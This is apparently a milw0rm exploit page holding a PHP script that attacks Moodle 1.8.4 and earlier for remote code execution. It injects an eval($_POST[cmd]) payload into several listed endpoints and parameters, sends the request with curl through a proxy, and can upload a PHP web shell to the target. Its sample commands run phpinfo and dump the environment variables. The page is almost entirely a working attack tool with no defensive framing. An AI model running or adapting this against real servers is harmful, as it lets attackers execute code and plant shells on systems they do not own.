<html><head><title>Moodle <= 1.8.4 Remote Code Execution Exploit</title></head><pre>&lt;?php
/**
 * Moodle &lt;= 1.8.4 remote code execution
 */
$url = 'http://target.ru/moodle';
$proxy = 'localhost:8118';

$code = $argv[1];
if(!$code) {
	echo 'Sample use:
		'.$argv[0].' &quot;phpinfo()&quot; &gt; phpinfo.html
		'.$argv[0].' &quot;echo `set`&quot;
		'.$argv[0].' /full/local/path/to/file/for/upload/php_shell.php
	';
	exit;
}
$upload = false;
if(file_exists($code) &amp;&amp; is_file($code)) {
	$upload = $code;
	$code = 'move_uploaded_file($_FILES[file][tmp_name], basename($_FILES[file][name]))';
}
$code .= ';exit;';

$injection_points = array(
	'blocks/rss_client/block_rss_client_error.php' =&gt; array('error'),
	'course/scales.php?id=1' =&gt; array('name', 'description'),
	'help.php' =&gt; array('text'),
	'login/confirm.php' =&gt; array('data', 's'),
	'mod/chat/gui_basic/index.php?id=1' =&gt; array('message'),
	'mod/forum/post.php' =&gt; array('name'),
	'mod/glossary/approve.php?id=1' =&gt; array('hook'),
	'mod/wiki/admin.php' =&gt; array('page'),
);
$file = array_rand($injection_points);
$param = $injection_points[$file][array_rand($injection_points[$file])];
$value = '&lt;img src=http&amp;{${eval($_POST[cmd])}};://target.ru&gt;';

$post_data = array($param=&gt;$value, 'cmd'=&gt;$code);
if($upload) {
	echo &quot;Check at:\n\t\t&quot;.$url.'/'.dirname($file).'/'.basename($upload).&quot;\n&quot;;
	$post_data[&quot;file&quot;] = '@'.$upload;
}

$c = curl_init();
curl_setopt($c, CURLOPT_URL, $url.'/'.$file);
curl_setopt($c, CURLOPT_PROXY, $proxy);
curl_setopt($c, CURLOPT_POST, true);
curl_setopt($c, CURLOPT_POSTFIELDS, $post_data);
curl_setopt($c, CURLOPT_RETURNTRANSFER, true);
curl_setopt($c, CURLOPT_HEADER, false);
echo curl_exec($c);
curl_close($c);
?&gt;

# milw0rm.com [2008-09-03]</pre></html>